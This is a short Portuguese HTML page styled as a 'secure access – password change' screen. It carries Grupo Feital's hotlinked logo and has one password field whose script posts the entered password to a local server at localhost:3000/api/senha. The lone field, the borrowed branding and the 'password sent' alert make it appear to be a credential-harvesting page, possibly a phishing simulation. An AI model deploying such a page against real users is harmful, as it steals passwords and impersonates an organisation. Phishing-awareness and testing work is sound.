<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8" />
    <title>Acesso Seguro – Alteração de Senha</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fefefe;
            text-align: center;
            padding-top: 100px;
        }

        input[type="password"] {
            padding: 10px;
            font-size: 16px;
            border-radius: 6px;
            border: 1px solid #ccc;
            width: 250px;
        }

        button {
            margin-top: 10px;
            padding: 10px 20px;
            font-size: 16px;
            background-color: #b31313;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
        }

        img {
            margin-top: 50px;
            width: 120px;
        }
    </style>
</head>
<body>
    <h2>Acesso Seguro – Alteração de Senha</h2>
    <form id="senhaForm">
        <input type="password" id="senha" placeholder="Digite a senha" required />
        <br />
        <button type="submit">Enviar</button>
    </form>

    <img src="https://grupo.feital.com.br/images/logo.png" alt="Grupo Feital" />

    <script>
    document.getElementById("senhaForm").addEventListener("submit", async function (e) {
      e.preventDefault();
      const senha = document.getElementById("senha").value;

      try {
        const response = await fetch("http://localhost:3000/api/senha", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ senha })
        });

        if (response.ok) {
          alert("Senha enviada com sucesso!");
          document.getElementById("senha").value = "";
        } else {
          alert("Erro ao enviar senha.");
        }
      } catch (error) {
        alert("Erro de conexão com o servidor.");
        console.error(error);
      }
    });
    </script>
</body>
</html>
